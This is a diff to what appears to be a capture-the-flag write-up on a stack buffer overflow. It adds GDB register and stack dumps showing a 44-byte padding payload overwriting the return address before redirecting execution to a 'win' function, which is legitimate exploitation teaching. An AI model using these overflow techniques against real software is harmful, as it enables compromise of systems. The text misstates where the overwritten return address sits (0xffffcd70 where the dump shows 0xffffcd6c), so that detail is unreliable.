@@ -175,13 +175,45 @@ python -c 'print "A"*44 + "B"*4' > payload
 
 Running these commands we take:
 
+```gdb
+=> 0x08048641 <vuln+18>:	83 c4 10	add    esp,0x10
+(gdb) info registers
+eax            0xffffcd40          -12992
+ecx            0xf7fad580          -134556288
+edx            0xffffcd70          -12944
+ebx            0x0                 0
+esp            0xffffcd30          0xffffcd30
+ebp            0xffffcd68          0xffffcd68
+esi            0xf7fad000          -134557696
+edi            0xf7fad000          -134557696
+eip            0x8048641           0x8048641 <vuln+18>
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/32wx $esp
+0xffffcd30:	0xffffcd40	0xf7fad000	0x0804a03c	0x0000001a
+0xffffcd40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd60:	0x41414141	0x41414141	0x41414141	0x42424242
+0xffffcd70:	0x00000000	0xffffce34	0xffffce3c	0x000003e8
+0xffffcd80:	0xf7fe39f0	0xffffcda0	0x00000000	0xf7de2fb9
+0xffffcd90:	0xf7fad000	0xf7fad000	0x00000000	0xf7de2fb9
+0xffffcda0:	0x00000001	0xffffce34	0xffffce3c	0xffffcdc4
+```
+We can see those A's inside the stack. And the 4 B's at 0xffffcd70 ($ebp + 0x4 == return address location).
+So, we expect our program to jump to 0x42424242.
+
 ```console
 Please enter your string: 
 Okay, time to return... Fingers Crossed... Jumping to 0x42424242
 Segmentation fault (core dumped)
 ```
 
-Exactly, we jumped to 0x42424242 which are the 4 B's(ascii-hex value of them).
+Exactly, we jumped to 0x42424242.
 Now, let's change the B's with the win's address.
 
 ```bash
